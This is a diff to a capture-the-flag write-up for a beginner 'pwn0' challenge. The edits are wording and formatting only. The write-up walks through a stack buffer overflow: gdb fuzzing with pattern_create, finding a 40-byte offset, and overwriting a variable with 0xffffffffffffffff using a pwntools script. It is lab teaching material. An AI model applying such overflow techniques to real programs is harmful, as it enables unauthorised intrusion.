@@ -10,36 +10,36 @@ From the source code, I understand that I need to modify the value of inspiratio
     <kbd><img src="images/pwn0-2.png" caption="Challenge" /></kbd><br/>
 </p>
 
-It compares `rbp-0x8` with 0xffffffffffffffff
+The program compares `rbp-0x8` with 0xffffffffffffffff
 
 <p align="center">
     <kbd><img src="images/pwn0-3.png" caption="Challenge" /></kbd><br/>
 </p>
 
-Perform fuzzing:
-`$ pattern_create 48`
+To start, perform fuzzing <br />
+`$ pattern_create 48` <br />
 <p align="center">
     <kbd><img src="images/pwn0-4.png" caption="Challenge" /></kbd><br/>
 </p>
 
-View registers
-`$ info registers`
+View registers <br />
+`$ info registers` <br />
 <p align="center">
     <kbd><img src="images/pwn0-5.png" caption="Challenge" /></kbd><br/>
 </p>
 
-Print the value in `rdp-0x8`
+Print the value stored on `rdp-0x8` <br />
 `$ p *0x7fffffffdfc8`
 <p align="center">
     <kbd><img src="images/pwn0-6.png" caption="Challenge" /></kbd><br/>
 </p>
 
-`$ pattern_offset 0x41304141`
+`$ pattern_offset 0x41304141` <br />
 <p align="center">
     <kbd><img src="images/pwn0-7.png" caption="Challenge" /></kbd><br/>
 </p>
 
-So, I need to spray 40 random characters and then 0xffffffffffffffff to modify the value of inspirational_message_index variable.
+So, I need to spray 40 random characters and then provide 0xffffffffffffffff to modify the value of inspirational_message_index variable.
 
 I created a script to perform our exploit.
 
@@ -56,8 +56,8 @@ p.sendline(input)
 p.interactive()
 ```
 
-Run the exploit:
-`$ python3 exploit.py`
+Run the exploit <br />
+`$ python3 exploit.py` <br />
 <p align="center">
     <kbd><img src="images/pwn0-8.png" caption="Challenge" /></kbd><br/>
 </p>
